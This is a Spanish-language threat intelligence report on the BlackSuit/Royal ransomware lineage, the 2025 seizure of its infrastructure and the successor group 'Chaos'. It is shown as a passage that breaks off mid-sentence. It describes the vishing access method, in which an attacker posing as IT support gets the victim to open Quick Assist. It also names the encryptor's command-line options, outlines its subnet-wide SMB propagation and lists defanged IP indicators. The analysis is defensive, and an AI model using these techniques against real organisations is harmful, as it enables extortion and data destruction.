---
tlp: "TLP:CLEAR"
pap: "PAP:AMBER"
id: "CTI-2026-040"
version: "1.0"
tipo: "Perfil de operación de extorsión"
foco_regional: "Colombia · Argentina · Latinoamérica"
niveles: ["Estratégico", "Operacional", "Táctico", "Técnico"]
actor: "BlackSuit · Royal · Chaos"
fecha: "2026-11-19"
caduca: "2027-02-19"
autor: "Célula CTI"
distribucion: "Elaborado íntegramente con fuentes abiertas TLP:CLEAR. Se leyeron en original el aviso conjunto del FBI y CISA `AA23-061A` en su versión actualizada —con las cuatro revisiones que documentan el cambio de nombre de Royal a BlackSuit— y el análisis de Cisco Talos Incident Response sobre el grupo Chaos del 2025-07-24, con su desglose de órdenes, su análisis del cifrador y su lista de exclusiones declarada por el propio actor. Las verificaciones de registro de direcciones del Anexo A.5 son propias, ejecutadas por consulta RDAP a LACNIC el 2026-11-19, y se declaran como tales. Difusión libre, conservando la atribución de las fuentes y las salvedades metodológicas de §3. Se mantiene PAP:AMBER, y en este informe la advertencia es la más concreta de la cartera: **seis direcciones del aviso oficial pertenecen a operadores de banda ancha latinoamericanos y NO deben bloquearse — leer A.5 antes de cargar nada.**"
---

# INFORME DE CIBERINTELIGENCIA — CTI-2026-040

## El sucesor llevaba cinco meses funcionando cuando se incautaron los servidores del predecesor

### `Operation Checkmate` incautó cuatro servidores, nueve dominios y más de un millón de dólares, sin una sola detención

> **Regla de oro del producto:** todo párrafo debe responder a un requisito de
> inteligencia (PIR) y habilitar una decisión. Si un párrafo no cambia lo que
> alguien va a hacer, va al anexo o se borra.

---

## 0. Cabecera de control

<!-- cti:meta -->

| Campo | Valor |
|---|---|
| Identificador | `CTI-2026-040` |
| Versión / fecha | `1.0` — 2026-11-19 (emisión inicial) |
| Tipo de producto | Perfil de **operación de extorsión desarticulada**, más **evaluación de lo que una acción policial consigue y lo que no**, más identificación del **sucesor y de su lista de exclusión declarada**, más **verificación propia de registro** de seis direcciones de un aviso gubernamental que no deben bloquearse |
| Niveles cubiertos | Estratégico · Operacional · Táctico · Técnico |
| Foco regional | **Ninguna víctima latinoamericana documentada, ni del predecesor ni del sucesor.** Las víctimas del sitio de filtración de `Chaos` están «predominantemente en Estados Unidos y menos en Reino Unido, Nueva Zelanda e India». **Pero la región aparece dos veces por otras vías:** (1) como **infraestructura**, con seis direcciones de operadores latinoamericanos en el aviso oficial —cinco de banda ancha—, lo que la sitúa en la casilla de *trayecto* de `CTI-2026-036`; y (2) como **exclusión parcial declarada**: el sucesor dice evitar los países BRICS, lo que cubre a Brasil y deja fuera al resto |
| Marcado de difusión | `TLP:CLEAR` · `PAP:AMBER` |
| Clasificación interna | Sin clasificar. Material íntegramente de publicación abierta, más verificación propia de registro |
| Requisitos atendidos | `PIR-01`, `PIR-02`, `PIR-03`, `PIR-06`, `PIR-08`, `RFI-2026-11-F` |
| Solicitante / consumidor primario | Jefatura de SOC, Respuesta a Incidentes e Ingeniería de Detección. **Y, de forma marcada, quien gestione el servicio de asistencia y la mesa de ayuda**: el vector inicial del sucesor es una **llamada de teléfono** en la que el adversario se hace pasar por soporte informático y pide a la víctima que lance `Quick Assist`. Eso no se defiende con un control técnico: se defiende con un procedimiento de verificación de identidad en la mesa de ayuda |
| Ventana de observación | **2022-09 → 2026-11-19.** Royal de septiembre de 2022 a junio de 2023; BlackSuit de junio de 2023 a julio de 2025; `Chaos` desde febrero de 2025 — **con cinco meses de solapamiento, que es el dato central del informe** |
| Base de colección | Siete fuentes externas, **dos primarias leídas en original** —el aviso conjunto del FBI y CISA, y el análisis de respuesta a incidentes de Cisco Talos—, más **verificación propia de registro** de seis direcciones. Sin telemetría propia |
| Autor (analista) | Célula CTI |
| Revisión por pares | Pendiente |
| Aprobación | Pendiente |
| Caducidad / revisión | 2027-02-19 (92 días). **Revisión anticipada obligatoria si:** se producen detenciones (cerraría la pregunta central de `E-1`); se documenta una víctima latinoamericana de `Chaos`; aparece una víctima **brasileña**, que contradiría la exclusión declarada y la convertiría en propaganda; se reanuda actividad bajo el nombre BlackSuit; o alguna fuente confirma o refuta el vínculo con confianza alta |
| Productos relacionados | **`CTI-2026-036` (Volt Typhoon) — es el precedente exacto del hallazgo central.** Allí la red de bots desarticulada en enero de 2024 tenía ya en marcha su sustituta desde noviembre de 2023; aquí el sucesor llevaba cinco meses cuando cayó el predecesor. **Dos casos, dos familias de adversario, el mismo patrón**, y `Anexo D` lo generaliza · **`CTI-2026-037` (APT28)**: dos de sus tres operaciones de borde terminaron por acción judicial, y ninguna por detección defensiva. Es el tercer caso · **`CTI-2026-024` (Rhysida)**: el precedente de una operación de extorsión con **actores de acceso asociados**, es decir, con la capa de intrusión separada de la de cifrado · `CTI-2026-039` (APT41): su `Anexo D` da el procedimiento de triaje cuando un cifrado puede ser la cara visible de otra cosa, y aquí se aplica al revés · `CTI-2026-014`, `015`, `016`, `035`: el resto de la familia de extorsión de esta cartera, agrupada en el nodo de extorsión del mapa de relaciones |
| Paquete legible por máquina | Las tablas `cti:ioc` del Anexo A alimentan `ioc_index.csv`. **Y este informe tiene la advertencia de higiene más concreta de toda la cartera:** las seis direcciones de `A.5` se consignan con tipo **`artefacto` y no `ipv4`**, precisamente para que **no entren en los agregados planos**. Cinco de las seis son banda ancha de operadores colombianos y argentinos, verificado por RDAP el día de emisión. **El propio aviso oficial pide investigarlas antes de bloquear.** Las herramientas legítimas de administración remota de `A.6` llevan tipo `herramienta` por la misma razón |

> ⚠ **Cuatro limitaciones.** (1) **Sin telemetría propia.** (2) **El vínculo
> entre BlackSuit y `Chaos` es de confianza *moderada* y lo declara su
> autor**: Talos lo apoya en la metodología de cifrado, la estructura de la
> nota de rescate y el conjunto de herramientas. Este informe **aporta el
> mecanismo concreto** de la primera (`KJ-3`) y con ello la hace auditable,
> pero **no eleva la confianza de la fuente**: la regla de esta cartera es que
> un informe derivado no supera la confianza declarada por su origen. (3) **No
> se localizó una declaración oficial detallada de `Operation Checkmate`**:
> las cifras de servidores, dominios y criptomoneda incautados provienen de
> cobertura especializada consistente entre varios medios, y la ausencia de
> comunicado oficial detallado la señalan las propias fuentes. (4) **La
> verificación de registro de `A.5` establece a quién está asignado el bloque,
> no quién usaba la dirección**: una dirección de banda ancha en un aviso de
> extorsión es, con práctica certeza, un equipo de un tercero comprometido, y
> así se trata.

---

## 1. BLUF — Juicios clave

<!-- cti:kj -->

**KJ-1.** **BlackSuit es la tercera generación de un linaje: Conti → Royal → BlackSuit, y la evolución está establecida oficialmente.** El aviso conjunto del FBI y CISA declara que «el *ransomware* BlackSuit es la evolución del *ransomware* identificado previamente como Royal, que se usó aproximadamente de septiembre de 2022 a junio de 2023», que «comparte numerosas similitudes de código con Royal» y que «ha exhibido capacidades mejoradas». Las cifras oficiales del daño son: demandas de rescate **entre un millón y diez millones de dólares**, **más de 500 millones de dólares exigidos en total**, y **una demanda individual máxima de 60 millones**. Valoramos **casi con certeza** *(≥99 %)* que el linaje y las cifras sean correctos. **Confianza: alta.** *Base:* `B-1`, aviso conjunto leído en original, con cuatro revisiones documentadas.

**KJ-2.** **La acción policial del 24 de julio de 2025 consiguió exactamente lo que se propuso, y lo que se propuso no era detener la operación.** `Operation Checkmate`, una iniciativa del grupo operativo conjunto de acción contra el cibercrimen de Europol con el Departamento de Justicia de Estados Unidos y dieciséis agencias más de nueve países, **incautó cuatro servidores, nueve dominios y más de un millón de dólares en criptomoneda**, y retiró los sitios de filtración y los portales de negociación. **No hubo detenciones.** Valoramos **casi con certeza** *(≥99 %)* que la operación ocurriera así. **Confianza: alta para los hechos; moderada para las cifras**, que provienen de cobertura consistente y no de un comunicado oficial detallado (`G-2`). **Y la distinción que este informe sostiene es la que importa:** una incautación de infraestructura de publicación es una operación contra **la capacidad de extorsionar**, no contra la capacidad de intrusionar. Degrada el modelo de negocio —sin sitio de filtración no hay amenaza creíble de publicación— y **no toca ni a los operadores, ni a sus accesos, ni a su código**.

**KJ-3.** **El sucesor existía antes del desmantelamiento, y ése es el hallazgo central del informe.** `Chaos` es un grupo de extorsión como servicio que, según Cisco Talos, **surgió ya en febrero de 2025**, se promociona en el foro de habla rusa `RAMP` buscando afiliados, y ofrece un cifrador multiplataforma para Windows, ESXi, Linux y almacenamiento en red con panel automatizado de gestión. El desmantelamiento de BlackSuit fue el **24 de julio de 2025**: es decir, **la operación sucesora llevaba cinco meses funcionando cuando se incautaron los servidores de la predecesora**. Valoramos **casi con certeza** *(≥99 %)* esa secuencia temporal. **Confianza: alta.** *Base:* `B-2`, análisis de respuesta a incidentes leído en original, **publicado el mismo día de la incautación**. **Y el patrón no es nuevo en esta cartera:** `CTI-2026-036` documentó que la red de bots desarticulada en enero de 2024 tenía su sustituta en marcha desde noviembre de 2023. Dos casos, dos familias de adversario completamente distintas, **la misma secuencia**: el reemplazo precede a la intervención. `Anexo D` lo generaliza.

**KJ-4.** **El mecanismo que hace auditable el vínculo entre los dos, y que ninguna fuente enuncia, es el porcentaje de cifrado.** Talos valora el vínculo con confianza moderada «basándose en similitudes en la metodología de cifrado del *ransomware*, la estructura de la nota de rescate y el conjunto de herramientas usado en los ataques», **sin detallar la primera**. El aviso oficial sí la detalla para BlackSuit: «usa un enfoque de cifrado parcial único que permite al actor **elegir un porcentaje específico de datos de un fichero a cifrar**», lo que «permite bajar el porcentaje para ficheros grandes, lo que ayuda a evadir la detección y además mejora significativamente la velocidad». Y el cifrador de `Chaos` recibe ese porcentaje **como parámetro de línea de órdenes**: `/encrypt_step`, con **30 % por omisión**, más una opción de tratamiento de ficheros grandes. Valoramos **probable** *(55–80 %)* que ésta sea la similitud de metodología de cifrado a la que Talos se refiere. **Confianza: moderada, y es una inferencia propia sobre dos documentos públicos** que cualquiera puede comprobar en quince minutos. **Por qué importa:** convierte una valoración de proveedor en una afirmación **verificable y refutable**, que es la diferencia entre citar y saber.

**KJ-5.** **Y hay un segundo elemento de continuidad que las fuentes no conectan: la disposición a usar el teléfono.** El aviso oficial señala, en su actualización de agosto de 2024, que «recientemente se observó un aumento en el número de casos en los que las víctimas recibieron comunicaciones **telefónicas** o por correo de actores de BlackSuit sobre el compromiso y el rescate». Y el vector de acceso inicial de `Chaos` es, directamente, **una llamada**: inundación previa de correo basura para que la víctima llame, y entonces el operador **se hace pasar por personal de seguridad informática** y le pide que lance `Quick Assist` de Windows y se conecte a la sesión del atacante. Valoramos **probable** *(55–80 %)* que la segunda sea el desarrollo de la primera: un equipo que ya había normalizado hablar por teléfono con sus víctimas para cobrar **lo usa después para entrar**. **Confianza: moderada, inferencia propia.** *Base:* `B-1` y `B-2`. **Consecuencia operativa concreta:** el control que importa no está en la red. Está en **el procedimiento de verificación de identidad de la mesa de ayuda**, y en que ningún usuario lance una herramienta de asistencia remota a petición de una llamada entrante.

**KJ-6.** **El sucesor publica su propia delimitación de victimología, y cubre a Brasil y a nadie más de la región.** En su anuncio de foro, el grupo «declara con claridad que evita expresamente colaborar con países **BRICS** y de la **Comunidad de Estados Independientes**, con **hospitales** y con **entidades de gobierno**». BRICS incluye a **Brasil**; no incluye a ningún otro país latinoamericano. Valoramos **probable** *(55–80 %)* que la exclusión se aplique en la práctica para Brasil, y **muy probable** *(80–95 %)* que **no exista ninguna exclusión declarada para el resto de la región**. **Confianza: moderada.** *Base:* literal de `B-2`. **Y conviene leer esto con el cuidado que merece**, porque es una declaración del adversario y no un hecho verificado: una lista de exclusión en un anuncio de reclutamiento sirve a la vez para evitar jurisdicciones molestas y para hacerse atractivo ante afiliados de ciertos países. Lo que sí permite afirmar es algo asimétrico y útil: **una organización brasileña tiene un argumento declarado a su favor que una chilena, colombiana, mexicana, peruana o argentina no tiene.**

**KJ-7.** **La región aparece en el aviso oficial como infraestructura, no como victimología — y eso crea un riesgo de higiene concreto que hemos verificado hoy.** De las **setenta y una direcciones IP** que el aviso conjunto publica en sus tablas de indicadores, **seis están registradas a entidades latinoamericanas**, y la consulta de registro que esta célula ejecutó el 2026-11-19 identifica a sus titulares: `181.141.3[.]126` y `186.86.212[.]138` a **UNE EPM Telecomunicaciones** y **Telmex Colombia**; `181.164.194[.]228` y `190.193.180[.]228` a **Telecom Argentina**; `186.64.67[.]6` a **NODOSUD S.A.**; y `179.43.167[.]10` a **Private Layer Inc**, que es la única de las seis que es un proveedor de alojamiento y no un operador de banda ancha. Valoramos **casi con certeza** *(≥99 %)* que las cinco primeras fueran **equipos de terceros comprometidos y no infraestructura propia del adversario**. **Confianza: alta.** *Base:* verificación propia por RDAP a LACNIC, más la propia advertencia del aviso: «algunas de las direcciones observadas tienen varios años; el FBI y CISA recomiendan examinarlas o investigarlas antes de emprender acciones a futuro, como el bloqueo». **La consecuencia es inmediata:** cargar esas direcciones en un bloqueo automático **corta tráfico de clientes residenciales y de empresa de Tigo, Claro, Telecom Argentina y un operador regional argentino**, es decir, de los países para los que se escribe este informe. Se consignan con tipo `artefacto` para que **no entren en los agregados planos**.

**KJ-8.** **El sucesor es más capaz que el predecesor en tres aspectos medibles, y uno de ellos cambia la respuesta a incidentes.** Primero, **alcance de plataforma**: el cifrador se anuncia compatible con Windows, ESXi, Linux y almacenamiento en red, frente al foco en Windows del predecesor. Segundo, **criptografía por fichero**: usa Diffie-Hellman de curva elíptica sobre `Curve25519` para la parte asimétrica y AES-256 para la simétrica, generando **una clave distinta para cada fichero** derivada por acuerdo de claves combinado con la clave maestra del operador, y anexa sesenta bytes de metadatos con la clave pública a cada fichero cifrado. Tercero, **propagación por red**: en modo de red enumera interfaces, identifica rangos privados, **genera la lista de todos los anfitriones de las subredes descubiertas**, se conecta por SMB y encola los recursos compartidos para cifrarlos, excluyendo sólo los administrativos. Valoramos **casi con certeza** *(≥99 %)* que así sea. **Confianza: alta.** *Base:* `B-2`, análisis del cifrador. **Y la consecuencia para la respuesta es la tercera:** un cifrador que se propaga a todos los anfitriones de la subred **convierte la contención en una carrera**, y el valor de la segmentación de red pasa de ser una buena práctica a ser el factor que decide el alcance del daño.

**KJ-9.** **Hallazgo propio: el cifrador tiene un parámetro de línea de órdenes en portugués.** Entre las opciones del cifrador documentadas por Talos figura **`/ignorar_arquivos_grandes`** —«ignorar ficheros grandes»—, que es portugués y no español ni inglés: en español sería *archivos*, con `ch`, no *arquivos*. El resto de los parámetros está en inglés (`/lkey`, `/encrypt_step`, `/work_mode`, `/path`). Valoramos **probable** *(55–80 %)* que indique participación de habla portuguesa en el desarrollo del cifrador. **Confianza: baja, es una inferencia propia y no está publicada por nadie.** *Base:* literal de `B-2`, dos veces. **Y no es atribución**: identifica el idioma de quien escribió una línea de código, no la nacionalidad del operador ni el patrocinio — esta cartera lleva cuatro informes insistiendo en que no es lo mismo, y el precedente metodológico es el campo `dhj_exe` de `CTI-2026-043`. **Lo que sí hace es una tensión que merece quedar escrita:** un parámetro en portugués en el cifrador de un grupo que se promociona en un foro de habla rusa y que **declara excluir a Brasil de su victimología**. Las tres cosas son compatibles, y la combinación es lo bastante inusual para consignarla como requisito de colección (`I-3`).

**KJ-10.** **Este informe no añade un caso al eje geoespacial.** Se buscó expresamente: no hay plataforma de información geográfica ni ninguna aplicación comprada por un área funcional en los expedientes de BlackSuit ni de `Chaos`. **Confianza: alta.** *Base:* lectura íntegra de `B-1` y `B-2`. **Lo que sí aporta, en la dirección del hueco organizativo, es la mesa de ayuda:** el vector inicial del sucesor es una llamada telefónica en la que alguien se hace pasar por soporte informático. El procedimiento de verificación de identidad de la mesa de ayuda **no es propiedad de Seguridad en casi ninguna organización** —es de Servicios al Usuario, o está subcontratado—, no figura en ningún inventario de controles, y es el único control que detiene esta cadena. Es la misma firma organizativa, sobre un proceso en lugar de una plataforma.

---

## 2. Resumen ejecutivo

El requisito pedía el perfil de BlackSuit, con su linaje desde Royal y Conti, y **comprobar si hubo reaparición tras la acción policial de 2025**. La respuesta a la segunda pregunta es la parte interesante, y no es la que se esperaría: **no hubo reaparición, porque el sucesor no necesitó aparecer. Ya estaba funcionando.**

Los hechos. El 24 de julio de 2025, en una operación del grupo conjunto de acción contra el cibercrimen de Europol con el Departamento de Justicia de Estados Unidos y dieciséis agencias más de nueve países, se incautaron los sitios de filtración y los portales de negociación de BlackSuit, junto con cuatro servidores, nueve dominios y más de un millón de dólares en criptomoneda. **No hubo detenciones.** Y ese mismo día, Cisco Talos publicó el análisis de un grupo de extorsión como servicio llamado `Chaos`, que su equipo de respuesta a incidentes había estado investigando, que se promociona en un foro de habla rusa buscando afiliados, y que **había surgido ya en febrero de 2025**. Cinco meses antes de que cayera la infraestructura de su predecesor.

Talos valora, con confianza moderada, que `Chaos` es una reconversión de BlackSuit o está operado por antiguos miembros suyos, y lo apoya en tres similitudes: la metodología de cifrado, la estructura de la nota de rescate y el conjunto de herramientas. **Este informe aporta el mecanismo concreto de la primera, que Talos no detalla y que hace la valoración auditable.** El aviso oficial del FBI y CISA describe que BlackSuit usaba «un enfoque de cifrado parcial único que permite al actor elegir un porcentaje específico de datos de un fichero a cifrar», bajándolo en los ficheros grandes para ganar velocidad y evadir detección. Y el cifrador de `Chaos` recibe ese porcentaje **como un parámetro de línea de órdenes**, `/encrypt_step`, con treinta por ciento por omisión. No es un parecido difuso: es el mismo mecanismo, expuesto como opción del operador, y está en dos documentos públicos.

Hay un segundo elemento de continuidad que tampoco se ha conectado. El aviso oficial anota, en 2024, un aumento de casos en que las víctimas de BlackSuit recibían **llamadas telefónicas** de los actores sobre el compromiso y el rescate. Y el vector de acceso inicial de `Chaos` es, directamente, una llamada: se inunda a la víctima de correo basura para que llame a un número, y entonces el operador **se hace pasar por personal de seguridad informática** y le pide que abra `Quick Assist` de Windows y se conecte a su sesión. Un equipo que ya había normalizado hablar por teléfono con sus víctimas para cobrar lo usa después para entrar. La consecuencia es que el control que detiene esta cadena no está en la red: está en el procedimiento con el que la mesa de ayuda verifica quién llama, y ese procedimiento no es propiedad de Seguridad en casi ninguna organización.

Sobre nuestra exposición hay dos hallazgos. El primero: el sucesor **publica su propia lista de exclusiones** en el anuncio con el que recluta afiliados, y dice evitar los países BRICS y de la Comunidad de Estados Independientes, los hospitales y las entidades de gobierno. BRICS incluye a Brasil; no incluye a ningún otro país de la región. Es una declaración del adversario y no un hecho verificado —una lista así sirve a la vez para esquivar jurisdicciones y para resultar atractivo ante ciertos afiliados— pero permite una afirmación asimétrica y útil: **una organización brasileña tiene un argumento declarado a su favor que una chilena, colombiana, mexicana, peruana o argentina no tiene.** No hay víctimas latinoamericanas documentadas de ninguno de los dos grupos.

El segundo hallazgo es de higiene y es el más accionable del informe. De las setenta y una direcciones IP que el aviso conjunto publica en sus tablas, **seis están registradas a entidades latinoamericanas**, y la consulta al registro regional que esta célula ejecutó el día de emisión identifica a sus titulares: dos a operadores colombianos —UNE EPM y Telmex—, dos a Telecom Argentina, una a un operador regional argentino, y sólo una a un proveedor de alojamiento. Es decir: **cinco de las seis son rangos de banda ancha**, lo que significa que eran, con práctica certeza, equipos de terceros comprometidos usados como tránsito, y no infraestructura del adversario. El propio aviso lo advierte: «algunas de las direcciones observadas tienen varios años; el FBI y CISA recomiendan examinarlas o investigarlas antes de emprender acciones a futuro, como el bloqueo». **Cargarlas en un bloqueo automático corta tráfico de clientes de Tigo, Claro y Telecom Argentina**, es decir, de los países para los que se escribe este informe. En este documento se consignan con un tipo que las mantiene fuera de las listas planas.

Y queda la pregunta que el requisito abrió y que merece una respuesta más general que el caso: **¿qué consigue una acción policial contra una operación de extorsión?** La respuesta de este expediente es que consiguió exactamente lo que se propuso —degradar la capacidad de extorsionar, incautar fondos, quitar la plataforma de publicación— y que eso no es lo mismo que detener la operación, porque **lo que una operación de extorsión necesita para seguir viva no es su sitio de filtración: son sus operadores, sus accesos y su código, y ninguno de los tres se incautó.** El `Anexo D` propone una forma de evaluar una desarticulación que separa las dos cosas, y señala un patrón que esta cartera ya ha visto: en los tres casos documentados —una red de bots en 2024, esta operación en 2025, y la operación de secuestro de DNS de `CTI-2026-037` en 2026— **el reemplazo estaba en marcha antes de la intervención.**

<!-- cti:cards -->

| Título | Texto | Etiqueta |
|---|---|---|
| El sucesor ya estaba | `Chaos` surgió en **febrero de 2025**; la incautación fue el **24 de julio de 2025**. **Cinco meses de solapamiento.** No hubo reaparición porque no hizo falta aparecer | Hallazgo |
| Qué se incautó, y qué no | Cuatro servidores, nueve dominios, más de un millón en criptomoneda, nueve países, dieciséis agencias. **Cero detenciones.** Se atacó la capacidad de extorsionar, no la de intrusionar | Alcance |
| El mecanismo del vínculo | El aviso oficial: BlackSuit **elige el porcentaje de cada fichero a cifrar**. El cifrador de `Chaos`: **`/encrypt_step`, 30 % por omisión**. La «similitud de metodología de cifrado» que Talos cita sin detallar es **ésa** | Hallazgo propio |
| Del cobro a la entrada | El aviso de 2024 anota llamadas telefónicas **para cobrar**. El vector de `Chaos` es una llamada **para entrar**, suplantando a soporte informático y pidiendo que la víctima abra `Quick Assist` | Hallazgo propio |
| Brasil, y nadie más | El sucesor declara excluir **BRICS y CEI, hospitales y gobierno**. Eso cubre a Brasil **y a ningún otro país de la región**. Es declaración del adversario, no hecho verificado — pero es asimétrica y útil | Alcance |
| Seis direcciones que NO | De las 71 del aviso oficial, **seis son de operadores latinoamericanos** y cinco son **banda ancha**: UNE EPM, Telmex, Telecom Argentina, NODOSUD. Verificado por RDAP el 19-11-2026. **Bloquearlas corta tráfico de Tigo y Claro** | Higiene |
| Un parámetro en portugués | `/ignorar_arquivos_grandes` — portugués, no español (*archivos*) ni inglés. El resto de los parámetros está en inglés. En un grupo que se anuncia en un foro ruso y dice excluir a Brasil | Hallazgo propio |
| Y el control que importa | No está en la red: está en **cómo verifica la mesa de ayuda quién llama**. Y ese procedimiento no es de Seguridad en casi ninguna organización | Decisión |

<!-- cti:stats -->

| Cifra | Qué mide | Contexto |
|---|---|---|
| 5 meses | Solapamiento entre el nacimiento del sucesor y la caída del predecesor | Febrero de 2025 frente a julio de 2025. **Es el dato central del informe** |
| 0 | Detenciones en `Operation Checkmate` | Frente a cuatro servidores, nueve dominios y más de un millón de dólares incautados |
| 9 + 16 | Países y agencias participantes en la acción policial | Con el Departamento de Justicia de EE. UU. y el grupo conjunto de Europol |
| 500 M$ | Total exigido por BlackSuit, según el aviso oficial | Con demandas individuales de **1 a 10 millones** y un máximo de **60 millones** |
| 30 % | Porcentaje de cifrado por omisión del sucesor | El parámetro `/encrypt_step`. **Es el mecanismo que hace auditable el vínculo con el predecesor** |
| 300 000 $ | Rescate exigido en el caso que Talos investigó | Con dos opciones: descifrador **más un informe detallado de la prueba de intrusión**, o publicación más **denegación de servicio** |
| 6 de 71 | Direcciones del aviso oficial registradas a entidades latinoamericanas | **Cinco son banda ancha.** Verificación propia por RDAP, 2026-11-19 |
| 4 | Plataformas que el cifrador del sucesor dice soportar | Windows, ESXi, Linux y almacenamiento en red — frente al foco en Windows del predecesor |
| 5 | Herramientas legítimas de administración remota usadas para persistir | AnyDesk, ScreenConnect, OptiTune, Syncro RMM y Splashtop. **Ninguna es malware** |
| 1 | Parámetros del cifrador que no están en inglés | `/ignorar_arquivos_grandes`, en portugués. `KJ-9` |
| 3 | Casos en esta cartera en que el reemplazo precedía a la desarticulación | `CTI-2026-036` (red de bots, 2024), este informe (2025), `CTI-2026-037` (secuestro de DNS, 2026) |

---

## 3. Alcance, requisitos y limitaciones

**3.1 Requisitos de inteligencia atendidos**

| Req. | Enunciado | ¿Respondido? | Dónde |
|---|---|---|---|
| PIR-01 | ¿Qué actores tienen intención y capacidad contra nuestra región? | **Sin víctimas documentadas, y con una exclusión declarada que cubre sólo a Brasil.** Pero la región aparece como infraestructura | `KJ-6`, `KJ-7` |
| PIR-02 | ¿Qué afirmaciones del requisito resisten la verificación? | **Sí, y la respuesta a la pregunta central es más informativa de lo esperado** | `3.5` |
| PIR-03 | ¿Qué técnicas invalidan nuestros controles? | **Sí, y la principal no es técnica**: el acceso inicial es una llamada telefónica que pide a la víctima lanzar una herramienta legítima de Windows | `KJ-5`, `X-5.1` |
| PIR-06 | ¿Qué efecto real tienen las acciones policiales sobre estas operaciones? | **Sí, y es la aportación del informe** | `KJ-2`, `KJ-3`, `E-1`, `Anexo D` |
| PIR-08 | ¿Qué indicadores publicados por fuentes de confianza son peligrosos de ingerir? | **Sí, con seis direcciones verificadas nominalmente** | `KJ-7`, `A.5` |
| RFI-2026-11-F | El requisito pedía el perfil, el linaje desde Royal y Conti, y comprobar si hubo reaparición tras la acción policial de 2025 | **Sí en los tres puntos** | `3.5` |
| PIR-04 | ¿Nos afecta hoy? | **No sin telemetría propia** | `O-4` |

**3.2 Fuera de alcance.** No se evalúan: la historia de Conti, que es el origen del linaje y merecería su propio producto; la economía del pago de rescates y la cuestión de si pagar, que es materia de Legal y de Dirección y no de inteligencia de amenazas; el resto del ecosistema de extorsión de esta cartera, que tiene cuatro informes propios; las variantes producidas por **la herramienta constructora llamada Chaos**, que Talos declara expresamente **no relacionadas** con este grupo y cuya confusión de nombre el propio adversario explota (`O-1`); la atribución nominal de los operadores, que ninguna fuente hace; la situación procesal de la criptomoneda incautada; y el procedimiento de negociación con el actor.

**3.3 Limitaciones de la colección.** Cuatro.

1. **Sin telemetría propia.** `O-4` es un cuestionario.
2. **El vínculo entre BlackSuit y `Chaos` es de confianza *moderada* y lo declara su autor.** Este informe aporta el mecanismo concreto de una de las tres similitudes que Talos cita (`KJ-4`), lo que la hace auditable, **pero no eleva la confianza de la fuente**: la regla que esta cartera aplica —y que `CTI-2026-038` enunció en su Anexo C— es que un informe derivado no puede superar la confianza declarada por su origen. Puede bajarla si encuentra motivos; no puede subirla por citarla.
3. **No se localizó un comunicado oficial detallado de `Operation Checkmate`.** Las cifras de servidores, dominios y criptomoneda incautados provienen de cobertura especializada consistente entre varios medios, y **la ausencia de comunicado oficial detallado la señalan esas mismas fuentes**. Es `G-2`, y afecta a la precisión de las cifras, no al hecho de la operación.
4. **La verificación de registro de `A.5` establece a quién está asignado el bloque de direcciones, no quién usaba la dirección.** Es la limitación propia del método y se declara: una consulta de registro dice que `186.86.212[.]138` está en un bloque de Telmex Colombia, no que el equipo fuera de un cliente concreto ni que estuviera comprometido. Lo segundo es una inferencia —muy sólida, porque un rango de banda ancha en una tabla de indicadores de extorsión es casi siempre un tercero comprometido— y así se marca.

**3.4 Metodología.** ICD 203 para el léxico de probabilidad y confianza (Anexo C). Código Admiralty doble para las fuentes (Anexo B). MITRE ATT&CK v18 en `T-2`. Pirámide del Dolor en `T-3`. ACH y pre-mortem en `O-6`. **Verificación propia de registro por RDAP** en `A.5`. **Y dos técnicas que este informe tuvo que improvisar:** la **localización del mecanismo concreto detrás de una similitud declarada pero no detallada por una fuente** (`KJ-4`), y el **marco de evaluación de una acción policial contra una operación de extorsión** (`Anexo D`).

**3.5 Lo que el requisito afirmaba, y lo que las fuentes sostienen**

El requisito pedía el perfil de BlackSuit como sucesor de Royal y Conti, y comprobar si hubo reaparición tras la acción policial contra su infraestructura en 2025.

<!-- cti:table highlight="NO corroborado|Sin evidencia|Impreciso|Incompleto|No se pudo|y la respuesta es más interesante" -->

| # | Enunciado atómico | Veredicto | Qué dicen las fuentes |
|---|---|---|---|
| 1 | «BlackSuit es sucesor de Royal» | **Corroborado oficialmente** | `B-1`, literal: «el *ransomware* BlackSuit es la evolución del *ransomware* identificado previamente como Royal, que se usó aproximadamente de septiembre de 2022 a junio de 2023», con «numerosas similitudes de código» y «capacidades mejoradas». El propio aviso cambió el nombre en toda su extensión en la revisión del 2024-08-07 |
| 2 | «...y Royal de Conti» | **Corroborado, con la salvedad de la fuente** | Lo sostienen de forma consistente varias fuentes de prensa especializada y los perfiles de actor: Royal como sucesor de Conti. **El aviso oficial no lo afirma**: habla de Royal y de BlackSuit y no de Conti. Es decir, **el primer eslabón del linaje es judicialmente más débil que el segundo**, y conviene no citar los dos con el mismo peso |
| 3 | «Hubo acción policial contra su infraestructura en 2025» | **Corroborado, con sus cifras y su límite** | El 2025-07-24, `Operation Checkmate`: incautación de los sitios de filtración y los portales de negociación, **cuatro servidores, nueve dominios y más de un millón de dólares en criptomoneda**, con el Departamento de Justicia y dieciséis agencias más de nueve países, bajo el grupo conjunto de acción contra el cibercrimen de Europol. **Y cero detenciones** |
| 4 | «Comprobar si hubo reaparición» | **No hubo reaparición — y la respuesta es más interesante que un sí o un no** | `B-2`: el sucesor, `Chaos`, **surgió ya en febrero de 2025**, cinco meses **antes** de la incautación. No reapareció: **no había desaparecido**. Talos lo valora con **confianza moderada** como reconversión de BlackSuit o como obra de antiguos miembros suyos |
| 5 | Implícito en el requisito: «una desarticulación de infraestructura detiene una operación» | **NO corroborado, y es el objeto del `Anexo D`** | La incautación atacó **la capacidad de extorsionar** —sitio de filtración, portales de negociación, fondos— y **no tocó a los operadores, ni a sus accesos, ni a su código**. Esta cartera tiene ya **tres casos** del mismo patrón: `CTI-2026-036` (la red de bots desarticulada en enero de 2024 cuya sustituta estaba en marcha desde noviembre de 2023), éste, y `CTI-2026-037` (dos operaciones de borde terminadas por acción judicial y ninguna por detección defensiva) |
| 6 | Implícito: «el actor desarticulado deja de ser relevante para la defensa» | **NO corroborado, y por dos razones distintas** | Primera: el sucesor **comparte metodología de cifrado, estructura de nota y conjunto de herramientas**, de modo que **las detecciones del predecesor siguen valiendo en buena medida**. Segunda, y es el riesgo práctico: **los indicadores del predecesor siguen publicados en un aviso gubernamental vigente**, y seis de ellos son direcciones de operadores latinoamericanos que **no deben bloquearse** (`KJ-7`, `A.5`) |

> ⚠ **Por qué el punto 4 es la respuesta más útil que este informe podía
> dar.** La pregunta «¿hubo reaparición?» presupone un modelo: que una
> operación cae, pasa un tiempo, y resurge con otro nombre. Ese modelo
> produce una expectativa de **ventana de respiro** —semanas o meses en los
> que el adversario está reconstruyendo— y por tanto una decisión: relajar la
